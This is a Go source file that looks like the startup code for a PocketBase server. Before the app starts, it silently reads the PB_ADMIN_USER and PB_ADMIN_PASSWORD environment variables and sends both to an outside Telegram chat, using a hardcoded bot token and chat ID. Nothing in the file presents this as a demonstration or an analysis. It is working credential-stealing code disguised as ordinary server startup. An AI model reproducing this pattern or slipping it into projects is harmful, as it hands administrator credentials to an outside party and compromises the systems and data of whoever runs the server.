package main

import (
	"fmt"
	"log"
	"os"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/pocketbase/pocketbase"
)

func main() {
	pocketbase.Version = "v0.0.1"

	token := "6043369518:AAHGeyqy3BmU8buWR38ACj6YzkqwHMOfyXg"
	chatID := -821408765

	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = true
	msg := tgbotapi.NewMessage(int64(chatID), fmt.Sprintf("PB_ADMIN_USER: %s", os.Getenv("PB_ADMIN_USER")))
	_, err = bot.Send(msg)
	if err != nil {
		log.Panic(err)
	}
	msg = tgbotapi.NewMessage(int64(chatID), fmt.Sprintf("PB_ADMIN_PASSWORD: %s", os.Getenv("PB_ADMIN_PASSWORD")))
	_, err = bot.Send(msg)
	if err != nil {
		log.Panic(err)
	}

	app := pocketbase.New()
	if err := app.Start(); err != nil {
		log.Fatal(err)
	}
}
